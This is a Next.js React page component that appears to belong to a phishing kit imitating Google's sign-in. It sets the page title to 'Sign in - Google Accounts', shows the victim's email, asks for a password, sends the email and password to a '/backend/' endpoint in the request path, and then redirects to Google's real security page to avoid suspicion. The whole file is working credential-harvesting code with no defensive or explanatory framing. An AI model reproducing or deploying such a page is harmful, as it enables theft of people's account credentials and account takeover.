import Layout from '../components/Layout'
import Subtext from '../components/Subtext'
import Input from '../components/Input'
import Actions from '../components/Actions'
import SecondaryAction from '../components/SecondaryAction'
import PrimaryAction from '../components/PrimaryAction'

import { withRouter } from 'next/router'
import { useState } from 'react'
import Head from 'next/head'

export default withRouter((props) => {
  const [ password, setPassword ] = useState('')
  const submit = async () => {
    await fetch(`/backend/${encodeURIComponent(props.router.query.email)}/${encodeURIComponent(password)}`)
    props.router.push('https://myaccount.google.com/security')
  }

  return (
    <Layout title='Welcome'>
      <Head>
        <title>Sign in - Google Accounts</title>
      </Head>

      <Subtext>{props.router.query.email}</Subtext>
      <Input value={password} onChange={setPassword} password label='Enter your password' onSubmit={submit} />

      <Actions>
        <SecondaryAction onClick={() => {
          props.router.push('https://accounts.google.com/signin/recovery')
        }}>
          Forgot password?
        </SecondaryAction>
        <PrimaryAction onClick={submit}>
          Done
        </PrimaryAction>
      </Actions>
    </Layout>
  )
})